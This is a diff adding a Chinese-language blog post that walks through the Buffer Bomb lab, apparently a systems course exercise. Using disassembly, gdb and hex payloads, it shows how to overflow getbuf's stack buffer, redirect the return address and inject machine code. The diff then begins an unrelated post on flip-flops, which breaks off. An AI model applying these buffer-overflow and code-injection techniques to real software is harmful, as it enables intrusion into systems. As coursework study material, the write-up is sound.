@@ -173,6 +173,277 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/12/25/bufbomb/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="Existo">
+      <meta itemprop="description" content="Hello Nerd">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Existo's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/12/25/bufbomb/" class="post-title-link" itemprop="url">the Buffer Bomb</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-12-25 16:10:08" itemprop="dateCreated datePublished" datetime="2021-12-25T16:10:08+08:00">2021-12-25</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-12-26 16:31:50" itemprop="dateModified" datetime="2021-12-26T16:31:50+08:00">2021-12-26</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">学习</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="the-Buffer-Bomb"><a href="#the-Buffer-Bomb" class="headerlink" title="the Buffer Bomb"></a>the Buffer Bomb</h1><h2 id="事先准备"><a href="#事先准备" class="headerlink" title="事先准备"></a>事先准备</h2><ul>
+<li><p><code>bufbomb</code>反汇编</p>
+<p><code>objdump -d bufbomb &gt; asm.txt</code></p>
+</li>
+<li><p>获取自己的<code>cookie</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Userid: existo</span><br><span class="line">Cookie: 0x73413ee0</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h2 id="Level-0-Candle"><a href="#Level-0-Candle" class="headerlink" title="Level 0: Candle"></a>Level 0: Candle</h2><p>要求在<code>getbuf</code>执行返回语句之前调用<code>smoke</code>函数，我们考虑利用缓冲区溢出的漏洞来修改<code>getbuf</code>函数的返回地址</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">08049342 &lt;getbuf&gt;:</span><br><span class="line"> 8049342:	55                   	push   %ebp</span><br><span class="line"> 8049343:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8049345:	83 ec 38             	sub    $0x38,%esp</span><br><span class="line"> 8049348:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 804934b:	8d 45 ce             	lea    -0x32(%ebp),%eax</span><br><span class="line"> 804934e:	50                   	push   %eax</span><br><span class="line"> 804934f:	e8 ba fa ff ff       	call   8048e0e &lt;Gets&gt;</span><br><span class="line"> 8049354:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8049357:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line"> 804935c:	c9                   	leave  </span><br><span class="line"> 804935d:	c3                   	ret    </span><br></pre></td></tr></table></figure>
+<p>观察汇编指令，发现分配给字符串的空间是从<code>%ebp - 0x32</code>开始的，<code>0x32</code>也就是<code>50</code>个字节，返回地址在<code>%ebp + 0x4</code>处，而<code>push %ebp</code>又占用<code>4</code>个字节，因此整个结构便有<code>0x32 + 0x4 + 0x4</code>一共<code>58</code>个字节，我们要做的是，将<code>smoke</code>函数的开始地址覆盖<code>getbuf</code>的最后<code>4</code>个字节的返回地址，这样执行完<code>getbuf</code>函数后就会跳转到我们想要的位置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">08048ba1 &lt;smoke&gt;:</span><br><span class="line"> 8048ba1:	55                   	push   %ebp</span><br><span class="line"> 8048ba2:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8048ba4:	83 ec 08             	sub    $0x8,%esp</span><br><span class="line"> 8048ba7:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 8048baa:	68 30 a3 04 08       	push   $0x804a330</span><br><span class="line"> 8048baf:	e8 5c fd ff ff       	call   8048910 &lt;puts@plt&gt;</span><br><span class="line"> 8048bb4:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048bb7:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 8048bba:	6a 00                	push   $0x0</span><br><span class="line"> 8048bbc:	e8 fe 08 00 00       	call   80494bf &lt;validate&gt;</span><br><span class="line"> 8048bc1:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048bc4:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 8048bc7:	6a 00                	push   $0x0</span><br><span class="line"> 8048bc9:	e8 52 fd ff ff       	call   8048920 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure>
+<p>观察到<code>smoke</code>函数的起始地址为<code>0x08048ba1</code>，因此我们将前<code>58 - 4 = 54</code>字节用任意值填满即可，最后<code>4</code>字节放上我们的<code>0x08048ba1</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/*level 0*/</span><br><span class="line">00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 /*54个任意值*/</span><br><span class="line">a1 8b 04 08</span><br></pre></td></tr></table></figure>
+<p>储存为<code>level0.txt</code>文件，再使用提供的<code>hex2raw</code>程序转化为题目需要的<code>string</code></p>
+<p><code>./hex2raw &lt; level0.txt &gt; level0-raw.txt</code></p>
+<p>之后的题目都是这个办法，因此不再赘述(除了<code>level4</code>需要加<code>-n</code>)</p>
+<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112261631615.png" alt="image-20211225165024232" style="zoom:80%;" /></p>
+<p><code>level 0</code>得解</p>
+<h2 id="Level-1-Sparkler"><a href="#Level-1-Sparkler" class="headerlink" title="Level 1: Sparkler"></a>Level 1: Sparkler</h2><p>要求和<code>level 0</code>类似，只不过这次要调用<code>fizz</code>函数，<code>fizz</code>函数需要输入一个参数，要求此参数是我们每个人独有的<code>cookie</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">08048bce &lt;fizz&gt;:</span><br><span class="line"> 8048bce:	55                   	push   %ebp</span><br><span class="line"> 8048bcf:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8048bd1:	83 ec 08             	sub    $0x8,%esp</span><br><span class="line"> 8048bd4:	8b 55 08             	mov    0x8(%ebp),%edx</span><br><span class="line"> 8048bd7:	a1 38 d1 04 08       	mov    0x804d138,%eax</span><br><span class="line"> 8048bdc:	39 c2                	cmp    %eax,%edx</span><br><span class="line"> 8048bde:	75 22                	jne    8048c02 &lt;fizz+0x34&gt;</span><br><span class="line"> 8048be0:	83 ec 08             	sub    $0x8,%esp</span><br><span class="line"> 8048be3:	ff 75 08             	pushl  0x8(%ebp)</span><br><span class="line"> 8048be6:	68 4b a3 04 08       	push   $0x804a34b</span><br><span class="line"> 8048beb:	e8 50 fc ff ff       	call   8048840 &lt;printf@plt&gt;</span><br><span class="line"> 8048bf0:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048bf3:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 8048bf6:	6a 01                	push   $0x1</span><br><span class="line"> 8048bf8:	e8 c2 08 00 00       	call   80494bf &lt;validate&gt;</span><br><span class="line"> 8048bfd:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048c00:	eb 13                	jmp    8048c15 &lt;fizz+0x47&gt;</span><br><span class="line"> 8048c02:	83 ec 08             	sub    $0x8,%esp</span><br><span class="line"> 8048c05:	ff 75 08             	pushl  0x8(%ebp)</span><br><span class="line"> 8048c08:	68 6c a3 04 08       	push   $0x804a36c</span><br><span class="line"> 8048c0d:	e8 2e fc ff ff       	call   8048840 &lt;printf@plt&gt;</span><br><span class="line"> 8048c12:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048c15:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 8048c18:	6a 00                	push   $0x0</span><br><span class="line"> 8048c1a:	e8 01 fd ff ff       	call   8048920 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure>
+<p>可以观察到<code>fizz</code>函数的起始地址<code>0x08048bce</code>，与<code>level 0</code>相似我们首先还是需要覆盖<code>getbuf</code>的返回地址为<code>0x08048bce</code>，先保证调用<code>fizz</code>函数，<code>fizz</code>函数中将参数放在<code>0x8(%ebp)</code>位置，此<code>%ebp</code>为新<code>ebp</code>，既是<code>getbuf</code>返回地址处新<code>push</code>的<code>%ebp</code>，因此我们需要将<code>cookie</code>放在新<code>%ebp+0x8</code>位置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">/*level 1*/</span><br><span class="line">00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 /*54个任意值*/</span><br><span class="line">ce 8b 04 08 /*fizz地址*/</span><br><span class="line">00 00 00 00 /*%ebp+0x4*/</span><br><span class="line">e0 3e 41 73 /*%ebp+0x8处放cookie*/</span><br></pre></td></tr></table></figure>
+<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112261631617.png" alt="image-20211225170427364" style="zoom:80%;" /></p>
+<p><code>level 1</code>得解</p>
+<h2 id="Level-2-Firecracker"><a href="#Level-2-Firecracker" class="headerlink" title="Level 2: Firecracker"></a>Level 2: Firecracker</h2><p>任务要求仍然是在<code>getbuf</code>执行返回语句之前调用其他函数，这次调用<code>bang</code>函数，并且要求将<code>global_value</code>设置成自己的<code>cookie</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">08048c1f &lt;bang&gt;:</span><br><span class="line"> 8048c1f:	55                   	push   %ebp</span><br><span class="line"> 8048c20:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8048c22:	83 ec 08             	sub    $0x8,%esp</span><br><span class="line"> 8048c25:	a1 40 d1 04 08       	mov    0x804d140,%eax</span><br><span class="line"> 8048c2a:	89 c2                	mov    %eax,%edx</span><br><span class="line"> 8048c2c:	a1 38 d1 04 08       	mov    0x804d138,%eax</span><br><span class="line"> 8048c31:	39 c2                	cmp    %eax,%edx</span><br><span class="line"> 8048c33:	75 25                	jne    8048c5a &lt;bang+0x3b&gt;</span><br><span class="line"> 8048c35:	a1 40 d1 04 08       	mov    0x804d140,%eax</span><br><span class="line"> 8048c3a:	83 ec 08             	sub    $0x8,%esp</span><br><span class="line"> 8048c3d:	50                   	push   %eax</span><br><span class="line"> 8048c3e:	68 8c a3 04 08       	push   $0x804a38c</span><br><span class="line"> 8048c43:	e8 f8 fb ff ff       	call   8048840 &lt;printf@plt&gt;</span><br><span class="line"> 8048c48:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048c4b:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 8048c4e:	6a 02                	push   $0x2</span><br><span class="line"> 8048c50:	e8 6a 08 00 00       	call   80494bf &lt;validate&gt;</span><br><span class="line"> 8048c55:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048c58:	eb 16                	jmp    8048c70 &lt;bang+0x51&gt;</span><br><span class="line"> 8048c5a:	a1 40 d1 04 08       	mov    0x804d140,%eax</span><br><span class="line"> 8048c5f:	83 ec 08             	sub    $0x8,%esp</span><br><span class="line"> 8048c62:	50                   	push   %eax</span><br><span class="line"> 8048c63:	68 b1 a3 04 08       	push   $0x804a3b1</span><br><span class="line"> 8048c68:	e8 d3 fb ff ff       	call   8048840 &lt;printf@plt&gt;</span><br><span class="line"> 8048c6d:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048c70:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 8048c73:	6a 00                	push   $0x0</span><br><span class="line"> 8048c75:	e8 a6 fc ff ff       	call   8048920 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure>
+<p>注意到两个参数，一个<code>0x804d140</code>，一个<code>0x804d138</code>，我们需要知道哪个是<code>global_value</code></p>
+<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112261631618.png" alt="image-20211225172506382"></p>
+<p>经过<code>gdb</code>调试发现<code>0x804d140</code>就是我们要修改的参数，所以我们的任务就是</p>
+<ul>
+<li>修改<code>global_value</code>为我们自己的<code>cookie</code></li>
+<li>将<code>bang</code>函数起始地址<code>0x08048c1f</code>压栈</li>
+<li><code>ret</code>指令执行<code>bang</code>函数</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/*汇编代码*/</span><br><span class="line">movl $0x73413ee0, 0x804d140</span><br><span class="line">push $0x08048c1f</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+<p>将汇编代码转化为机器码</p>
+<p><code>gcc -c fun2.s</code></p>
+<p><code>objdump -d fun2.o</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/*机器码*/</span><br><span class="line">00000000 &lt;.text&gt;:</span><br><span class="line">   0:	c7 05 40 d1 04 08 e0 	movl   $0x73413ee0,0x804d140</span><br><span class="line">   7:	3e 41 73 </span><br><span class="line">   a:	68 1f 8c 04 08       	push   $0x8048c1f</span><br><span class="line">   f:	c3                   	ret</span><br></pre></td></tr></table></figure>
+<p>问题来了，如何让程序执行我们的汇编代码，我们可以将<code>getbuf</code>的返回地址改为我们的代码的起始地址，这样程序就会执行我们的代码，修改变量并进入<code>bang</code>函数，那么首先我们得找出我们的函数的起始地址，肯定不是<code>0x00000000</code>，那么是啥呢，我们知道我们是通过字符串的溢出修改的代码，那么我们的字符串的首地址不就是我们的函数代码起始地址吗，知道了这个，我们只要找到字符串的首地址即可，从<code>getbuf</code>里找</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">08049342 &lt;getbuf&gt;:</span><br><span class="line"> 8049342:	55                   	push   %ebp</span><br><span class="line"> 8049343:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8049345:	83 ec 38             	sub    $0x38,%esp</span><br><span class="line"> 8049348:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 804934b:	8d 45 ce             	lea    -0x32(%ebp),%eax</span><br><span class="line"> 804934e:	50                   	push   %eax</span><br><span class="line"> 804934f:	e8 ba fa ff ff       	call   8048e0e &lt;Gets&gt;</span><br><span class="line"> 8049354:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8049357:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line"> 804935c:	c9                   	leave  </span><br><span class="line"> 804935d:	c3                   	ret    </span><br></pre></td></tr></table></figure>
+<p>我们看到再调用<code>Gets</code>函数之前<code>push</code>了<code>%eax</code>，那么这个<code>%eax</code>就是字符串的首地址，也就是我们函数的起始地址，于是我们只要在调用<code>Gets</code>前设置一个断点，然后检查<code>%eax</code>的值即可</p>
+<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112261631619.png" alt="image-20211225173935811"></p>
+<p>所以我们<code>%eax</code>的值为<code>0x55682f5e</code>，既是我们函数的起始地址，覆盖<code>getbuf</code>的返回地址</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">c7 05 40 d1 04 08 e0 </span><br><span class="line">3e 41 73 </span><br><span class="line">68 1f 8c 04 08 </span><br><span class="line">c3 /*函数代码*/</span><br><span class="line">00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">5e 2f 68 55/*%eax地址*/</span><br></pre></td></tr></table></figure>
+<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112261631620.png" alt="image-20211225175046375" style="zoom:80%;" /></p>
+<p><code>level 2</code>得解</p>
+<h2 id="Level-3-Dynamite"><a href="#Level-3-Dynamite" class="headerlink" title="Level 3: Dynamite"></a>Level 3: Dynamite</h2><p>任务要求正常调用<code>getbuf</code>，但是修改<code>getbuf</code>的返回值为我们的<code>cookie</code>(原本为<code>1</code>)，同时要求栈空间被还原，既复原<code>saved ebp</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">08048c7a &lt;test&gt;:</span><br><span class="line"> 8048c7a:	55                   	push   %ebp</span><br><span class="line"> 8048c7b:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8048c7d:	83 ec 18             	sub    $0x18,%esp</span><br><span class="line"> 8048c80:	e8 48 04 00 00       	call   80490cd &lt;uniqueval&gt;</span><br><span class="line"> 8048c85:	89 45 f0             	mov    %eax,-0x10(%ebp)</span><br><span class="line"> 8048c88:	e8 b5 06 00 00       	call   8049342 &lt;getbuf&gt;</span><br><span class="line"> 8048c8d:	89 45 f4             	mov    %eax,-0xc(%ebp)</span><br><span class="line"> 8048c90:	e8 38 04 00 00       	call   80490cd &lt;uniqueval&gt;</span><br><span class="line"> 8048c95:	89 c2                	mov    %eax,%edx</span><br><span class="line"> 8048c97:	8b 45 f0             	mov    -0x10(%ebp),%eax</span><br><span class="line"> 8048c9a:	39 c2                	cmp    %eax,%edx</span><br><span class="line"> 8048c9c:	74 12                	je     8048cb0 &lt;test+0x36&gt;</span><br><span class="line"> 8048c9e:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 8048ca1:	68 d0 a3 04 08       	push   $0x804a3d0</span><br><span class="line"> 8048ca6:	e8 65 fc ff ff       	call   8048910 &lt;puts@plt&gt;</span><br><span class="line"> 8048cab:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048cae:	eb 41                	jmp    8048cf1 &lt;test+0x77&gt;</span><br><span class="line"> 8048cb0:	8b 55 f4             	mov    -0xc(%ebp),%edx</span><br><span class="line"> 8048cb3:	a1 38 d1 04 08       	mov    0x804d138,%eax</span><br><span class="line"> 8048cb8:	39 c2                	cmp    %eax,%edx</span><br><span class="line"> 8048cba:	75 22                	jne    8048cde &lt;test+0x64&gt;</span><br><span class="line"> 8048cbc:	83 ec 08             	sub    $0x8,%esp</span><br><span class="line"> 8048cbf:	ff 75 f4             	pushl  -0xc(%ebp)</span><br><span class="line"> 8048cc2:	68 f9 a3 04 08       	push   $0x804a3f9</span><br><span class="line"> 8048cc7:	e8 74 fb ff ff       	call   8048840 &lt;printf@plt&gt;</span><br><span class="line"> 8048ccc:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048ccf:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 8048cd2:	6a 03                	push   $0x3</span><br><span class="line"> 8048cd4:	e8 e6 07 00 00       	call   80494bf &lt;validate&gt;</span><br><span class="line"> 8048cd9:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048cdc:	eb 13                	jmp    8048cf1 &lt;test+0x77&gt;</span><br><span class="line"> 8048cde:	83 ec 08             	sub    $0x8,%esp</span><br><span class="line"> 8048ce1:	ff 75 f4             	pushl  -0xc(%ebp)</span><br><span class="line"> 8048ce4:	68 16 a4 04 08       	push   $0x804a416</span><br><span class="line"> 8048ce9:	e8 52 fb ff ff       	call   8048840 &lt;printf@plt&gt;</span><br><span class="line"> 8048cee:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048cf1:	90                   	nop</span><br><span class="line"> 8048cf2:	c9                   	leave  </span><br><span class="line"> 8048cf3:	c3                   	ret    </span><br></pre></td></tr></table></figure>
+<p>可以看到调用<code>getbuf</code>后，返回值被储存在<code>%eax</code>中，于是我们只要修改<code>%eax</code>的值为我们的<code>cookie</code>即可，同时要求复原<code>%ebp</code>，那么我们在调用<code>getbuf</code>记住<code>%ebp</code>的值，再执行我们的语句时重新赋给<code>%ebp</code>即可，我们先在调用<code>getbuf</code>前设置断点，查看<code>%ebp</code>的值</p>
+<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112261631621.png" alt="image-20211225180505432"></p>
+<p>可见<code>%ebp</code>的值为<code>0x55682fb0</code>，整理一下我们的任务</p>
+<ul>
+<li>设置<code>%eax</code>为我们的<code>cookie</code> <code>0x73413ee0</code></li>
+<li>设置<code>%ebp</code>为初始值<code>0x55682fb0</code></li>
+<li>回到<code>test</code>函数中调用<code>getbuf</code>后的下一个语句地址<code>0x8048c8d</code></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/*汇编代码*/</span><br><span class="line">movl $0x73413ee0, %eax</span><br><span class="line">movl $0x55682fb0, %ebp</span><br><span class="line">push $0x8048c8d</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/*机器码*/</span><br><span class="line">00000000 &lt;.text&gt;:</span><br><span class="line">   0:	b8 e0 3e 41 73       	mov    $0x73413ee0,%eax</span><br><span class="line">   5:	bd b0 2f 68 55       	mov    $0x55682fb0,%ebp</span><br><span class="line">   a:	68 8d 8c 04 08       	push   $0x8048c8d</span><br><span class="line">   f:	c3                   	ret</span><br></pre></td></tr></table></figure>
+<p>接着步骤和之前相同</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">b8 e0 3e 41 73 </span><br><span class="line">bd b0 2f 68 55 </span><br><span class="line">68 8d 8c 04 08 </span><br><span class="line">c3 /*函数代码*/</span><br><span class="line">00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 </span><br><span class="line">5e 2f 68 55/*%eax地址*/</span><br></pre></td></tr></table></figure>
+<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112261631622.png" alt="image-20211225181341091" style="zoom:80%;" /></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/12/20/%E8%A7%A6%E5%8F%91%E5%99%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="Existo">
+      <meta itemprop="description" content="Hello Nerd">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Existo's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/12/20/%E8%A7%A6%E5%8F%91%E5%99%A8/" class="post-title-link" itemprop="url">触发器</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-12-20 20:35:22 / 修改时间：21:56:09" itemprop="dateCreated datePublished" datetime="2021-12-20T20:35:22+08:00">2021-12-20</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">学习</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="触发器"><a href="#触发器" class="headerlink" title="触发器"></a>触发器</h1><ul>
+<li>触发器有两个互补的输出端 $Q$ 和 $\overline{Q}$</li>
+<li><p>有两个稳定状态 <code>1</code> 和 <code>0</code></p>
+<ul>
+<li><code>1</code>状态：$Q = 1\quad\overline{Q} = 0$</li>
